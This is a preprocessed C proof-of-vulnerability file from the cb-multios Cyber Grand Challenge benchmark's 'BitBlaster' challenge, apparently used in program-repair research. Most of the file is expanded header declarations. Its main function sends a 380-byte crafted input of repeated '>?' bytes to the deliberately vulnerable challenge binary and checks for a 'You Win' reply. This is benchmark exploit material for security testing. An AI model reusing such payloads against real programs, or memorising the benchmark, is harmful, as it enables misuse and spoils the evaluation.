# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/challenges/BitBlaster/pov_1/pov.c"
# 1 "<built-in>" 1
# 1 "<built-in>" 3
# 336 "<built-in>" 3
# 1 "<command line>" 1
# 1 "<built-in>" 2
# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/challenges/BitBlaster/pov_1/pov.c" 2
# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h" 1




# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libcgc.h" 1
# 19 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libcgc.h"
typedef unsigned long cgc_size_t;
typedef long cgc_ssize_t;
# 51 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libcgc.h"
typedef long int _fd_mask;



typedef struct {
    _fd_mask _fd_bits[1024 / (8 * sizeof(_fd_mask))];
} cgc_fd_set;
# 75 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libcgc.h"
struct cgc_timeval {
    int tv_sec;
    int tv_usec;
};
# 122 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libcgc.h"
void cgc__terminate(unsigned int status) __attribute__((__noreturn__));
int cgc_transmit(int fd, const void *buf, cgc_size_t count, cgc_size_t *tx_bytes);
int cgc_receive(int fd, void *buf, cgc_size_t count, cgc_size_t *rx_bytes);
int cgc_fdwait(int nfds, cgc_fd_set *readfds, cgc_fd_set *writefds,
               const struct cgc_timeval *timeout, int *readyfds);
int cgc_allocate(cgc_size_t length, int is_X, void **addr);
int cgc_deallocate(void *addr, cgc_size_t length);
int cgc_random(void *buf, cgc_size_t count, cgc_size_t *rnd_bytes);



typedef struct { long _b[8]; } jmp_buf[1];
extern int cgc_setjmp(jmp_buf) __attribute__((__returns_twice__));
extern void cgc_longjmp(jmp_buf, int) __attribute__((__noreturn__));

extern float cgc_sinf(float); extern double cgc_sin(double); extern long double cgc_sinl(long double);
extern float cgc_cosf(float); extern double cgc_cos(double); extern long double cgc_cosl(long double);
extern float cgc_tanf(float); extern double cgc_tan(double); extern long double cgc_tanl(long double);
extern float cgc_logf(float); extern double cgc_log(double); extern long double cgc_logl(long double);
extern float cgc_rintf(float); extern double cgc_rint(double); extern long double cgc_rintl(long double);
extern float cgc_sqrtf(float); extern double cgc_sqrt(double); extern long double cgc_sqrtl(long double);
extern float cgc_fabsf(float); extern double cgc_fabs(double); extern long double cgc_fabsl(long double);
extern float cgc_log2f(float); extern double cgc_log2(double); extern long double cgc_log2l(long double);
extern float cgc_exp2f(float); extern double cgc_exp2(double); extern long double cgc_exp2l(long double);
extern float cgc_expf(float); extern double cgc_exp(double); extern long double cgc_expl(long double);
extern float cgc_log10f(float); extern double cgc_log10(double); extern long double cgc_log10l(long double);

extern float cgc_powf(float, float);
extern double cgc_pow(double, double);
extern long double cgc_powl(long double, long double);
extern float cgc_atan2f(float, float);
extern double cgc_atan2(double, double);
extern long double cgc_atan2l(long double, long double);
extern float cgc_remainderf(float, float);
extern double cgc_remainder(double, double);
extern long double cgc_remainderl(long double, long double);
extern float cgc_scalbnf(float, int);
extern double cgc_scalbn(double, int);
extern long double cgc_scalbnl(long double, int);
extern float cgc_scalblnf(float, long int);
extern double cgc_scalbln(double, long int);
extern long double cgc_scalblnl(long double, long int);
extern float cgc_significandf(float);
extern double cgc_significand(double);
extern long double cgc_significandl(long double);
# 6 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h" 2
# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_string.h" 1





# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_types.h" 1





typedef char __int8_t;
typedef unsigned char __uint8_t;
typedef short __int16_t;
typedef unsigned short __uint16_t;
typedef int __int32_t;
typedef unsigned int __uint32_t;
typedef long long __int64_t;
typedef unsigned long long __uint64_t;

typedef __int8_t int8_t;
typedef __uint8_t uint8_t;
typedef __int16_t int16_t;
typedef __uint16_t uint16_t;
typedef __int32_t int32_t;
typedef __uint32_t uint32_t;
typedef __int64_t int64_t;
typedef __uint64_t uint64_t;

typedef uint32_t useconds_t;




    typedef __builtin_va_list va_list;
# 7 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_string.h" 2

void *cgc_memcpy(void *dst, const void *src, cgc_size_t len);
int cgc_memcmp(const void *b1, const void *b2, cgc_size_t n);
void *cgc_memset(void *b, int c, cgc_size_t len);

char *strcpy(char *dst, const char *src);

int cgc_strcmp(const char *s1, const char *s2);
int cgc_strncmp(const char *s1, const char *s2, cgc_size_t n);

cgc_size_t cgc_strlen(const char *str);

char *cgc_strchr(const char *s, int c);
# 7 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h" 2
# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_stdlib.h" 1







void *cgc_malloc(cgc_size_t size);
void *cgc_realloc(void *ptr, cgc_size_t size);
void cgc_free(void *ptr);

long strtol(const char *, char **, int);
unsigned long strtoul(const char *, char **, int);

int cgc_putenv(const char *name, const unsigned char *value, cgc_size_t value_len);
unsigned char *cgc_getenv(const char *name, cgc_size_t *len);

int cgc_isalnum(int c);
int cgc_isalpha(int c);
int cgc_iscntrl(int c);
int cgc_isdigit(int c);
int cgc_isgraph(int c);
int cgc_islower(int c);
int cgc_isprint(int c);
int cgc_ispunct(int c);
int cgc_isspace(int c);
int cgc_isupper(int c);
int cgc_isxdigit(int c);
# 8 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h" 2
# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_ctype.h" 1




int cgc_isalnum(int c);

int cgc_isalpha(int c);

int isascii(int c);

int isblank(int c);

int cgc_iscntrl(int c);

int cgc_isdigit(int c);

int cgc_isgraph(int c);

int cgc_islower(int c);

int cgc_isprint(int c);

int cgc_ispunct(int c);

int cgc_isspace(int c);

int cgc_isupper(int c);

int cgc_isxdigit(int c);

int cgc_toupper(int c);
int cgc_tolower(int c);
# 9 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h" 2
# 1 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_pcre.h" 1
# 297 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_pcre.h"
struct real_pcre;
typedef struct real_pcre pcre;

struct real_pcre16;
typedef struct real_pcre16 pcre16;

struct real_pcre32;
typedef struct real_pcre32 pcre32;

struct real_pcre_jit_stack;
typedef struct real_pcre_jit_stack pcre_jit_stack;

struct real_pcre16_jit_stack;
typedef struct real_pcre16_jit_stack pcre16_jit_stack;

struct real_pcre32_jit_stack;
typedef struct real_pcre32_jit_stack pcre32_jit_stack;
# 349 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_pcre.h"
typedef struct pcre_extra {
  unsigned long int flags;
  void *study_data;
  unsigned long int match_limit;
  void *callout_data;
  const unsigned char *tables;
  unsigned long int match_limit_recursion;
  unsigned char **mark;
  void *executable_jit;
} pcre_extra;



typedef struct pcre16_extra {
  unsigned long int flags;
  void *study_data;
  unsigned long int match_limit;
  void *callout_data;
  const unsigned char *tables;
  unsigned long int match_limit_recursion;
  unsigned short **mark;
  void *executable_jit;
} pcre16_extra;



typedef struct pcre32_extra {
  unsigned long int flags;
  void *study_data;
  unsigned long int match_limit;
  void *callout_data;
  const unsigned char *tables;
  unsigned long int match_limit_recursion;
  unsigned int **mark;
  void *executable_jit;
} pcre32_extra;






typedef struct pcre_callout_block {
  int version;

  int callout_number;
  int *offset_vector;
  const char * subject;
  int subject_length;
  int start_match;
  int current_position;
  int capture_top;
  int capture_last;
  void *callout_data;

  int pattern_position;
  int next_item_length;

  const unsigned char *mark;

} pcre_callout_block;



typedef struct pcre16_callout_block {
  int version;

  int callout_number;
  int *offset_vector;
  const unsigned short * subject;
  int subject_length;
  int start_match;
  int current_position;
  int capture_top;
  int capture_last;
  void *callout_data;

  int pattern_position;
  int next_item_length;

  const unsigned short *mark;

} pcre16_callout_block;



typedef struct pcre32_callout_block {
  int version;

  int callout_number;
  int *offset_vector;
  const unsigned int * subject;
  int subject_length;
  int start_match;
  int current_position;
  int capture_top;
  int capture_last;
  void *callout_data;

  int pattern_position;
  int next_item_length;

  const unsigned int *mark;

} pcre32_callout_block;
# 462 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_pcre.h"
extern void *(*pcre_malloc)(cgc_size_t);
extern void (*pcre_free)(void *);
extern void *(*pcre_stack_malloc)(cgc_size_t);
extern void (*pcre_stack_free)(void *);
extern int (*pcre_callout)(pcre_callout_block *);
extern int (*pcre_stack_guard)(void);

extern void *(*pcre16_malloc)(cgc_size_t);
extern void (*pcre16_free)(void *);
extern void *(*pcre16_stack_malloc)(cgc_size_t);
extern void (*pcre16_stack_free)(void *);
extern int (*pcre16_callout)(pcre16_callout_block *);
extern int (*pcre16_stack_guard)(void);

extern void *(*pcre32_malloc)(cgc_size_t);
extern void (*pcre32_free)(void *);
extern void *(*pcre32_stack_malloc)(cgc_size_t);
extern void (*pcre32_stack_free)(void *);
extern int (*pcre32_callout)(pcre32_callout_block *);
extern int (*pcre32_stack_guard)(void);
# 507 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/pov/cgc_pcre.h"
typedef pcre_jit_stack *(*pcre_jit_callback)(void *);
typedef pcre16_jit_stack *(*pcre16_jit_callback)(void *);
typedef pcre32_jit_stack *(*pcre32_jit_callback)(void *);



extern pcre *pcre_compile(const char *, int, const char **, int *,
                  const unsigned char *);
extern pcre16 *pcre16_compile(const unsigned short *, int, const char **, int *,
                  const unsigned char *);
extern pcre32 *pcre32_compile(const unsigned int *, int, const char **, int *,
                  const unsigned char *);
extern pcre *pcre_compile2(const char *, int, int *, const char **,
                  int *, const unsigned char *);
extern pcre16 *pcre16_compile2(const unsigned short *, int, int *, const char **,
                  int *, const unsigned char *);
extern pcre32 *pcre32_compile2(const unsigned int *, int, int *, const char **,
                  int *, const unsigned char *);
extern int cgc_pcre_config(int, void *);
extern int pcre16_config(int, void *);
extern int pcre32_config(int, void *);
extern int pcre_copy_named_substring(const pcre *, const char *,
                  int *, int, const char *, char *, int);
extern int pcre16_copy_named_substring(const pcre16 *, const unsigned short *,
                  int *, int, const unsigned short *, unsigned short *, int);
extern int pcre32_copy_named_substring(const pcre32 *, const unsigned int *,
                  int *, int, const unsigned int *, unsigned int *, int);
extern int pcre_copy_substring(const char *, int *, int, int,
                  char *, int);
extern int pcre16_copy_substring(const unsigned short *, int *, int, int,
                  unsigned short *, int);
extern int pcre32_copy_substring(const unsigned int *, int *, int, int,
                  unsigned int *, int);
extern int pcre_dfa_exec(const pcre *, const pcre_extra *,
                  const char *, int, int, int, int *, int , int *, int);
extern int pcre16_dfa_exec(const pcre16 *, const pcre16_extra *,
                  const unsigned short *, int, int, int, int *, int , int *, int);
extern int pcre32_dfa_exec(const pcre32 *, const pcre32_extra *,
                  const unsigned int *, int, int, int, int *, int , int *, int);
extern int pcre_exec(const pcre *, const pcre_extra *, const char *,
                   int, int, int, int *, int);
extern int pcre16_exec(const pcre16 *, const pcre16_extra *,
                   const unsigned short *, int, int, int, int *, int);
extern int pcre32_exec(const pcre32 *, const pcre32_extra *,
                   const unsigned int *, int, int, int, int *, int);
extern int pcre_jit_exec(const pcre *, const pcre_extra *,
                   const char *, int, int, int, int *, int,
                   pcre_jit_stack *);
extern int pcre16_jit_exec(const pcre16 *, const pcre16_extra *,
                   const unsigned short *, int, int, int, int *, int,
                   pcre16_jit_stack *);
extern int pcre32_jit_exec(const pcre32 *, const pcre32_extra *,
                   const unsigned int *, int, int, int, int *, int,
                   pcre32_jit_stack *);
extern void pcre_free_substring(const char *);
extern void pcre16_free_substring(const unsigned short *);
extern void pcre32_free_substring(const unsigned int *);
extern void pcre_free_substring_list(const char **);
extern void pcre16_free_substring_list(const unsigned short * *);
extern void pcre32_free_substring_list(const unsigned int * *);
extern int pcre_fullinfo(const pcre *, const pcre_extra *, int,
                  void *);
extern int pcre16_fullinfo(const pcre16 *, const pcre16_extra *, int,
                  void *);
extern int pcre32_fullinfo(const pcre32 *, const pcre32_extra *, int,
                  void *);
extern int pcre_get_named_substring(const pcre *, const char *,
                  int *, int, const char *, const char **);
extern int pcre16_get_named_substring(const pcre16 *, const unsigned short *,
                  int *, int, const unsigned short *, const unsigned short * *);
extern int pcre32_get_named_substring(const pcre32 *, const unsigned int *,
                  int *, int, const unsigned int *, const unsigned int * *);
extern int pcre_get_stringnumber(const pcre *, const char *);
extern int pcre16_get_stringnumber(const pcre16 *, const unsigned short *);
extern int pcre32_get_stringnumber(const pcre32 *, const unsigned int *);
extern int pcre_get_stringtable_entries(const pcre *, const char *,
                  char **, char **);
extern int pcre16_get_stringtable_entries(const pcre16 *, const unsigned short *,
                  unsigned short **, unsigned short **);
extern int pcre32_get_stringtable_entries(const pcre32 *, const unsigned int *,
                  unsigned int **, unsigned int **);
extern int pcre_get_substring(const char *, int *, int, int,
                  const char **);
extern int pcre16_get_substring(const unsigned short *, int *, int, int,
                  const unsigned short * *);
extern int pcre32_get_substring(const unsigned int *, int *, int, int,
                  const unsigned int * *);
extern int pcre_get_substring_list(const char *, int *, int,
                  const char ***);
extern int pcre16_get_substring_list(const unsigned short *, int *, int,
                  const unsigned short * **);
extern int pcre32_get_substring_list(const unsigned int *, int *, int,
                  const unsigned int * **);
extern const unsigned char *pcre_maketables(void);
extern const unsigned char *pcre16_maketables(void);
extern const unsigned char *pcre32_maketables(void);
extern int cgc_pcre_refcount(pcre *, int);
extern int pcre16_refcount(pcre16 *, int);
extern int pcre32_refcount(pcre32 *, int);
extern pcre_extra *pcre_study(const pcre *, int, const char **);
extern pcre16_extra *pcre16_study(const pcre16 *, int, const char **);
extern pcre32_extra *pcre32_study(const pcre32 *, int, const char **);
extern void pcre_free_study(pcre_extra *);
extern void pcre16_free_study(pcre16_extra *);
extern void pcre32_free_study(pcre32_extra *);
extern const char *cgc_pcre_version(void);
extern const char *pcre16_version(void);
extern const char *pcre32_version(void);


extern int pcre_pattern_to_host_byte_order(pcre *, pcre_extra *,
                  const unsigned char *);
extern int pcre16_pattern_to_host_byte_order(pcre16 *, pcre16_extra *,
                  const unsigned char *);
extern int pcre32_pattern_to_host_byte_order(pcre32 *, pcre32_extra *,
                  const unsigned char *);
extern int pcre16_utf16_to_host_byte_order(unsigned short *,
                  const unsigned short *, int, int *, int);
extern int pcre32_utf32_to_host_byte_order(unsigned int *,
                  const unsigned int *, int, int *, int);



extern pcre_jit_stack *cgc_pcre_jit_stack_alloc(int, int);
extern pcre16_jit_stack *pcre16_jit_stack_alloc(int, int);
extern pcre32_jit_stack *pcre32_jit_stack_alloc(int, int);
extern void cgc_pcre_jit_stack_free(pcre_jit_stack *);
extern void pcre16_jit_stack_free(pcre16_jit_stack *);
extern void pcre32_jit_stack_free(pcre32_jit_stack *);
extern void cgc_pcre_assign_jit_stack(pcre_extra *,
                  pcre_jit_callback, void *);
extern void pcre16_assign_jit_stack(pcre16_extra *,
                  pcre16_jit_callback, void *);
extern void pcre32_assign_jit_stack(pcre32_extra *,
                  pcre32_jit_callback, void *);
extern void cgc_pcre_jit_free_unused_memory(void);
extern void pcre16_jit_free_unused_memory(void);
extern void pcre32_jit_free_unused_memory(void);
# 10 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h" 2






typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;
# 46 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h"
int cgc_type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals);







int cgc_type2_negotiate(type2_vals *t2vals);





int cgc_type2_submit(const unsigned char *val, cgc_size_t len);
# 71 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/include/libpov/libpov.h"
void cgc_delay(unsigned int msec);
unsigned char *cgc_append_var(const char *var, unsigned char *buf, unsigned int *buflen);
unsigned char *cgc_append_slice(const char *var, int begin, int end, unsigned char *buf, unsigned int *buflen);
unsigned char *cgc_append_buf(unsigned char *buf, unsigned int *buflen, unsigned char *sbuf, unsigned int sbuflen);

int cgc_delimited_read(int fd, unsigned char **buf, unsigned int *size, unsigned char *delim, unsigned int delim_len);
int cgc_length_read(int fd, unsigned char *buf, unsigned int len);
int cgc_transmit_all(int fd, const void *buf, const cgc_size_t size);

typedef struct _match_result {
   unsigned int match_start;
   unsigned int match_end;
   unsigned int len0;
} match_result;

pcre *cgc_init_regex(const char *pattern);
int cgc_regex_match(pcre *regex, unsigned int group, const unsigned char *buf, unsigned int len, match_result *res);

void cgc_negotiate_type1(unsigned int ipmask, unsigned int regmask, unsigned int regnum);
void cgc_negotiate_type2();
void cgc_submit_type2(const char *var);

cgc_size_t cgc_var_match(const unsigned char *readbuf, unsigned int buflen, const char *varName);
unsigned int cgc_data_match(const unsigned char *readbuf, unsigned int buflen, const unsigned char *data, unsigned int datalen);
unsigned int pcre_match(const unsigned char *readbuf, unsigned int buflen, const char *regex);

void cgc_assign_from_slice(const char *var, const void *readbuf, unsigned int buflen, int low, int high, int doMax);
void cgc_assign_from_pcre(const char *var, const void *readbuf, unsigned int buflen, const char *regex, int group);
# 2 "/home/epicosy/thesis/implementation/repair/SecureThemAll2/benchmark/cb-multios/challenges/BitBlaster/pov_1/pov.c" 2
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {

      static unsigned char write_00000_00000[] =
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f"
         "\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f\x3e\x3f";
      static unsigned int write_00000_00000_len = 380;
      unsigned char *write_00000 = (0);
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;

      static unsigned char read_00000_delim[] =
         "\x0a";
      read_00000 = (0);
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {}

      static unsigned char match_00000_00000[] =
         "\x59\x6f\x75\x20\x57\x69\x6e\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 8);
      cgc_free(read_00000);
      if (read_00000_ptr) {}
   } while (0);
}
